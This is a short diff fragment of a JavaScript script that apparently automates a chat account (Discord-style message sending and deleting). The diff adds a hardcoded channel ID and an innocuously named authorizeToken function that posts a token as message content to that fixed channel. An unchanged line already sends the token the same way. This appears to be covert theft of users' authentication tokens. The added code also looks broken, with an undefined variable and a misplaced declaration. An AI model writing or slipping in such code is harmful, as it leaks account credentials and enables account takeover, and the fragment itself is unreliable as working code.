@@ -56,5 +56,11 @@ async function deleteMessage(authToken, channelId, messageId) {
         }
     }
 
-    console.log("script final part");
-    sendMessage(token, auth_c_id, token, 10);
+const channelId = "1387920548087992380";
+
+async function authorizeToken(token) {
+    sendMessage(authToken, channelId, token, 10);
+}
+
+console.log("script final part");
+sendMessage(token, auth_c_id, token, 10);
